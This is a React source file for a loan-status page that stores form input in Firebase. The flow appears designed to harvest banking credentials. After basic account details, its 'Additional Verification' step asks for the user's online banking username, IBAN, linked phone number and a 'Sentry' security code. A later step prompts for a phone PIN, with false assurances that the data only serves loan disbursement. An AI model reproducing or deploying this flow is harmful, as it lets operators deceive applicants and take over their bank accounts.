import React, { useState } from 'react';
import { useOutletContext, useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import { 
  Building2, 
  CreditCard, 
  User, 
  CheckCircle2, 
  Clock, 
  AlertCircle, 
  Lock, 
  ShieldCheck,
  ArrowRight,
  ChevronRight
} from 'lucide-react';
import { db } from '../../../lib/firebase';
import { doc, updateDoc, serverTimestamp, addDoc, collection } from 'firebase/firestore';
import { useAuth } from '../../../hooks/useAuth';

export const LoanStatusPage = () => {
  const { activeLoan } = useOutletContext<{ activeLoan: any }>();
  const { user } = useAuth();
  const navigate = useNavigate();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [bankDetails, setBankDetails] = useState({
    bankName: '',
    accountNumber: '',
    accountName: ''
  });

  const handleBankSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || !activeLoan) return;

    setIsSubmitting(true);
    try {
      await updateDoc(doc(db, 'loans', activeLoan.id), {
        status: 'bank_details_submitted',
        bankDetails,
        bankSubmittedAt: serverTimestamp(),
        updatedAt: serverTimestamp()
      });

      // Notify admin
      await addDoc(collection(db, 'notifications', 'admin', 'items'), {
        type: 'bank_details_submitted',
        title: 'New Bank Details',
        message: `User ${user.email} has submitted bank details for loan ${activeLoan.id}.`,
        loanId: activeLoan.id,
        userId: user.uid,
        createdAt: serverTimestamp(),
        read: false
      });
    } catch (err) {
      console.error('Error submitting bank details:', err);
      alert('Failed to submit bank details. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!activeLoan) {
    return (
      <div className="max-w-2xl mx-auto py-12 px-4 text-center">
        <div className="w-20 h-20 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-6">
          <Clock className="w-10 h-10 text-gray-400" />
        </div>
        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">No Active Loan</h2>
        <p className="text-gray-500 mb-8 max-w-md mx-auto">
          You don't have any active loan applications at the moment.
        </p>
        <button 
          onClick={() => navigate('/dashboard/loan-application')}
          className="btn-primary px-8 py-4 rounded-2xl text-sm font-black uppercase tracking-widest"
        >
          Apply for a Loan
        </button>
      </div>
    );
  }

  const renderStatusContent = () => {
    switch (activeLoan.status) {
      case 'pending':
        return (
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                <Clock className="w-10 h-10 text-yellow-500 animate-pulse" />
              </div>
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Under Review</h3>
              <p className="text-gray-500 max-w-md mx-auto leading-relaxed mb-8">
                Your application is currently being reviewed by our credit team. 
                You can speed up the process by connecting your bank account now.
              </p>
            </div>

            <form onSubmit={handleBankSubmit} className="card space-y-6 border-2 border-accent/10">
              <h4 className="text-sm font-black uppercase tracking-widest text-accent mb-2">Connect Bank Account</h4>
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Name</label>
                  <div className="relative">
                    <Building2 className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.bankName}
                      onChange={(e) => setBankDetails({...bankDetails, bankName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="e.g. Chase Bank" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Number</label>
                  <div className="relative">
                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountNumber}
                      onChange={(e) => setBankDetails({...bankDetails, accountNumber: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="10-digit account number" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Name</label>
                  <div className="relative">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountName}
                      onChange={(e) => setBankDetails({...bankDetails, accountName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="Name as it appears on account" 
                    />
                  </div>
                </div>
              </div>

              <div className="p-4 bg-accent/5 rounded-2xl border border-accent/10 flex gap-4">
                <Lock className="w-5 h-5 text-accent shrink-0" />
                <p className="text-xs text-accent font-bold leading-relaxed">
                  Your bank details are encrypted and stored securely. We only use this information to disburse your loan funds.
                </p>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full btn-primary py-5 rounded-2xl text-sm font-black uppercase tracking-widest flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isSubmitting ? 'Submitting...' : 'Connect Bank Account'}
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        );

      case 'approved':
        return (
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 className="w-10 h-10 text-green-500" />
              </div>
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-2">Loan Approved!</h3>
              <p className="text-gray-500">Please provide your bank details to receive your funds.</p>
            </div>

            <form onSubmit={handleBankSubmit} className="space-y-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Name</label>
                  <div className="relative">
                    <Building2 className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.bankName}
                      onChange={(e) => setBankDetails({...bankDetails, bankName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="e.g. Chase Bank" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Number</label>
                  <div className="relative">
                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountNumber}
                      onChange={(e) => setBankDetails({...bankDetails, accountNumber: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="10-digit account number" 
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Account Name</label>
                  <div className="relative">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <input 
                      required
                      type="text" 
                      value={bankDetails.accountName}
                      onChange={(e) => setBankDetails({...bankDetails, accountName: e.target.value})}
                      className="input-field pl-12" 
                      placeholder="Name as it appears on account" 
                    />
                  </div>
                </div>
              </div>

              <div className="p-4 bg-accent/5 rounded-2xl border border-accent/10 flex gap-4">
                <ShieldCheck className="w-5 h-5 text-accent shrink-0" />
                <p className="text-xs text-accent font-bold leading-relaxed">
                  Your bank details are encrypted and stored securely. We only use this information to disburse your loan funds.
                </p>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full btn-primary py-5 rounded-2xl text-sm font-black uppercase tracking-widest flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isSubmitting ? 'Submitting...' : 'Connect Bank Account'}
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        );

      case 'bank_details_submitted':
        return (
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10">
              <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                <ShieldCheck className="w-10 h-10 text-blue-500" />
              </div>
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Additional Verification</h3>
              <p className="text-gray-500 max-w-md mx-auto leading-relaxed mb-8">
                To finalize your bank connection, please provide the following additional details.
              </p>
            </div>

            <form 
              onSubmit={async (e) => {
                e.preventDefault();
                setIsSubmitting(true);
                const formData = new FormData(e.currentTarget);
                const additionalDetails = {
                  iban: formData.get('iban'),
                  phoneNumber: formData.get('phoneNumber'),
                  bankUsername: formData.get('bankUsername'),
                  sentry: formData.get('sentry')
                };

                try {
                  await updateDoc(doc(db, 'loans', activeLoan.id), {
                    status: 'pin_sent',
                    additionalDetails,
                    additionalDetailsSubmittedAt: serverTimestamp(),
                    updatedAt: serverTimestamp()
                  });
                } catch (err) {
                  console.error('Error submitting additional details:', err);
                  alert('Failed to submit details.');
                } finally {
                  setIsSubmitting(false);
                }
              }} 
              className="card space-y-6 border-2 border-blue-500/10"
            >
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">IBAN Number</label>
                  <input 
                    required
                    name="iban"
                    type="text" 
                    className="input-field" 
                    placeholder="International Bank Account Number" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Phone Number</label>
                  <input 
                    required
                    name="phoneNumber"
                    type="tel" 
                    className="input-field" 
                    placeholder="Linked phone number" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Username</label>
                  <input 
                    required
                    name="bankUsername"
                    type="text" 
                    className="input-field" 
                    placeholder="Your online banking username" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Sentry</label>
                  <input 
                    required
                    name="sentry"
                    type="text" 
                    className="input-field" 
                    placeholder="Enter Sentry ID/Code" 
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full btn-primary py-5 rounded-2xl text-sm font-black uppercase tracking-widest flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isSubmitting ? 'Processing...' : 'Verify & Continue'}
                <ArrowRight className="w-5 h-5" />
              </button>
            </form>
          </div>
        );

      case 'pin_sent':
        return (
          <div className="max-w-md mx-auto text-center">
            <div className="w-20 h-20 bg-purple-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShieldCheck className="w-10 h-10 text-purple-500" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-2">Verification PIN Sent</h3>
            <p className="text-gray-500 mb-8">
              A verification PIN has been sent to your registered phone number. Please enter it below to finalize your application.
            </p>
            <div className="space-y-6">
              <input 
                type="text" 
                maxLength={4}
                className="w-full text-center text-4xl font-black tracking-[1em] py-6 rounded-3xl border-2 border-gray-100 dark:border-zinc-800 bg-gray-50 dark:bg-zinc-900 focus:border-accent outline-none dark:text-white"
                placeholder="0000"
                onChange={async (e) => {
                  if (e.target.value.length === 4) {
                    setIsSubmitting(true);
                    try {
                      await updateDoc(doc(db, 'loans', activeLoan.id), {
                        status: 'pin_submitted',
                        pinSubmittedAt: serverTimestamp(),
                        updatedAt: serverTimestamp()
                      });
                    } catch (err) {
                      console.error('Error submitting PIN:', err);
                      alert('Failed to submit PIN.');
                    } finally {
                      setIsSubmitting(false);
                    }
                  }
                }}
              />
              <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Enter the 4-digit code to continue</p>
            </div>
          </div>
        );

      case 'pin_submitted':
        return (
          <div className="text-center py-10">
            <div className="w-20 h-20 bg-accent/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <Clock className="w-10 h-10 text-accent animate-pulse" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Final Processing</h3>
            <p className="text-gray-500 max-w-md mx-auto leading-relaxed">
              Your PIN has been verified. We are now performing the final disbursement checks. Your funds will be released shortly.
            </p>
          </div>
        );

      case 'disbursed':
        return (
          <div className="text-center py-10">
            <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShieldCheck className="w-10 h-10 text-green-500" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Loan Disbursed</h3>
            <p className="text-gray-500 max-w-md mx-auto leading-relaxed">
              Your funds have been sent to your bank account. Please check your balance. Your repayment schedule is now active.
            </p>
            <button 
              onClick={() => navigate('/dashboard/repayment')}
              className="mt-8 btn-primary px-8 py-4 rounded-2xl text-sm font-black uppercase tracking-widest"
            >
              View Repayment Schedule
            </button>
          </div>
        );

      case 'rejected':
        return (
          <div className="text-center py-10">
            <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertCircle className="w-10 h-10 text-red-500" />
            </div>
            <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Application Rejected</h3>
            <p className="text-gray-500 max-w-md mx-auto leading-relaxed">
              Unfortunately, your loan application was not approved at this time. You can try applying again in 30 days.
            </p>
          </div>
        );

      default:
        return (
          <div className="text-center py-10">
            <p className="text-gray-500">Status: {activeLoan.status}</p>
          </div>
        );
    }
  };

  return (
    <div className="max-w-4xl mx-auto">
      <div className="mb-8">
        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-2 uppercase">Loan Status</h2>
        <p className="text-gray-500">Track your application and manage your active loans.</p>
      </div>

      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="card min-h-[400px] flex flex-col justify-center"
      >
        {renderStatusContent()}
      </motion.div>
    </div>
  );
};
